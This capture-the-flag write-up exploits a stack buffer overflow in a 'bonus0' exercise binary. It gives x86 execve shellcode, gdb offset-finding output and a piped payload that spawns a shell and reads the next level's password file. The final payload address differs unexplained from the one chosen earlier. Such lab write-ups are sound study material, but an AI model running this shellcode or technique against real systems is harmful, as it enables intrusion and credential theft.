# bonus 0

the main run pp() that runs p() 2 times with local_34[20] and local_20[20]
as the buffers are limited to 20 we don't have enought space to inject shellcode
so we need to export shellcode as env var

    export SHELLCODE=`python -c "print('A' * 1024 + '\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80')"`

we use gdb to find the addr of shellcode in env

    gdb ./bonus0
    start
    x/s *((char **)environ+3)
    0xbfffe857:	 "SHELLCODE=", 'A' <repeats 190 times>...

find free addr to run our shellcode

    x/12wx 0xbfffe857
    0xbfffe857:	0x4c454853	0x444f434c	0x41413d45	0x41414141
    0xbfffe867:	0x41414141	0x41414141	0x41414141	0x41414141
    0xbfffe877:	0x41414141	0x41414141	0x41414141	0x41414141

we choose 0xbfffe867 

find the offset 

    run 
    Starting program: /home/user/bonus0/bonus0 
    - 
    01234567890123456789
    - 
    Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq
    01234567890123456789Aa0Aa1Aa2Aa3Aa4Aa5Aa��� Aa0Aa1Aa2Aa3Aa4Aa5Aa���

    Program received signal SIGSEGV, Segmentation fault.
    0x41336141 in ?? ()

41336141 -> A3aA sowe have an offset of 9

> first arg

20 - bytes (max buffer)

> second arg

9 - bytes padding
4 - bytes shellcode addr
7 - bytes (leftover buffer space)


    $ (python -c "print 'A' * 20"; python -c "print 'A' * 9 + '\x67\xf8\xff\xbf' + 'A' * 7"; cat) | ./bonus0
    - 
    - 
    AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA����A AAAAAAAAAAAAAA����A
    cat /home/user/bonus1/.pass
    cd1f77a585965341c37a1774a1d1686326e1fc53aaa5459c840409d4d06523c9

shell code:
http://shell-storm.org/shellcode/files/shellcode-575.html

"\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80"